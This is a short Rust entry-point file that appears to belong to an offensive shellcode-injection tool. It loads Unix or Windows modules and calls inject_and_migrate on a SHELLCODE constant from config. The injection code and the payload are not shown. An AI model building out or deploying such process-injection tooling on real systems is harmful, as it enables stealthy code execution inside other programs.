// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(unix)]
mod rco_proc_mig_unix;
#[cfg(unix)]
use rco_proc_mig_unix::inject_and_migrate;

#[cfg(windows)]
extern crate windows;
#[cfg(windows)]
mod rco_proc_mig_windows;
#[cfg(windows)]
use rco_proc_mig_windows::inject_and_migrate;

fn main() {
    inject_and_migrate(config::SHELLCODE);
}